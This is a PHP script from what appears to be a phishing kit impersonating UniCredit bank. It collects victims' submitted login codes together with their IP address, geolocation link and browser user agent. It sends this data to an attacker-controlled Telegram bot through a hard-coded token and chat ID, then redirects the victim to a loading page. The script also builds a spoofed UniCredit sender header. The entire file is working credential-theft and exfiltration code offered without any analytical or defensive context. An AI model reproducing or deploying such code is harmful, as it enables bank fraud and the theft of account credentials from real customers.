<?php
$adresse_ip = $_SERVER['REMOTE_ADDR'];
//error_reporting(0);
set_time_limit(0);
session_start();
include('__CONFIG__.php');
$Cookie['cookie_file'] = __DIR__.'/logs/' . sha1(time()) . '.log';


function sendMessage($messaggio) {
  $chatID = '-377598373'; // like: '-826930901'
  $token = '828568367:AAHdrMwXiv4fY3FxmdBhfNcobcHv4lObUsY'; //like: '824274280:AAFEMb-0Ro8-KH1yRHHVB5Eo6f4BhZijSu8'
  
  $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
  $url = $url . "&text=" . urlencode($messaggio);
  $ch = curl_init();
  $optArray = array(
          CURLOPT_URL => $url,
          CURLOPT_RETURNTRANSFER => true
  );
  curl_setopt_array($ch, $optArray);
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}


  $subject  = "unicredit [ LOGIN ] - ".$_SERVER['REMOTE_ADDR']."";
            $headers  = "From: unicredit cvv <infos@unicredit.de>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        

			
$Z118_MESSAGE .= "
+----/!\----<.![+]  UNICREDIT RZLT  [+]!.>---/!\----+
------------------      CC INFO        --------------
 [chiffre]           : "  .$_POST["chiffre"]."
 [code 9 chiffre]       : "  .$_POST["code"]."
+----/!\----<.![+] IP GEOINFO  [+]!.>---/!\----+
 [IP] :  https://geoiptool.com/en/?ip=".$adresse_ip."
 [DT] :  ".$TIME_DATE."
 [BR] :  ".$_SERVER['HTTP_USER_AGENT']."
+----/!\----<.! UNICREDIT RZLT !.>---/!\----+>
\n";
      
  sendMessage($Z118_MESSAGE);    
           

            header('location: loading1.html');
?>